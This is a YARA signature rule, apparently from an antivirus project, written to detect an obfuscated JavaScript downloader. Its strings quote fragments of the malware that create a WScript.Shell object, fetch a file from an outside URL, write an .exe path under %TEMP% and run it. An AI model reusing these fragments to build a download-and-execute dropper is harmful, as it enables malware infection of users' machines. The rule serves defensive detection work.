rule sig_20160401_a313c828c940f49cfc66681cf8bad6a0 {
  meta:
    description = "datamaliciousorder - file 20160401_a313c828c940f49cfc66681cf8bad6a0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2d3dc8a45f545346b53b86997e70c12a9cc60a0b3642dae102ac3cb7d7d84c41"

  strings:
    $s1  = "var KeOsx = function QxzPyq() {return WScript[CosMv](\"WScript\"+\".Shell\");}(), NfFd = 11;" fullword ascii
    $s2  = "function IjNbu(DpOz, FwBp){HxMy = HxMy * 1; return DpOz - FwBp;};" fullword ascii
    $s3  = "if (LrtMkf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "LrtMkf[TzxLyu](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s5  = "function MiyRe(){return KvKx + \"\";};" fullword ascii
    $s6  = "function YePy() {return KeOsx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JVWIWGiUx.ex\" + \"e\";};" fullword ascii
    $s7  = "function OmAgt() {return ((ZcxFii == true) && (ZcxFii == NdzTyy)) ? 1 : HxMy;};" fullword ascii
    $s8  = "function RvJsy(){return CosMv;};" fullword ascii
    $s9  = "var KjJpg = false;" fullword ascii
    $s10 = "function LvVbs(){return 23;};" fullword ascii
    $s11 = "var ZcxFii = false;" fullword ascii
    $s12 = "function TnbTo(CkvZwi){KeOsx[\"R\"+\"un\"](CkvZwi, HxMy, HxMy);};" fullword ascii
    $s13 = "var RyDq = new this[\"Date\"]();" fullword ascii
    $s14 = "function KmiEal(AauYe) {var VuTnf = (1, 2, 3, 4, 5, AauYe); return VuTnf;};" fullword ascii
    $s15 = "function TpzSkl()" fullword ascii
    $s16 = "}while (WhKs);" fullword ascii
    $s17 = "var NdzTyy = false;" fullword ascii
    $s18 = "ZcxFii = true; " fullword ascii
    $s19 = "NdzTyy = true; " fullword ascii
    $s20 = "return IjNbu(MnmBb, LgUba);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}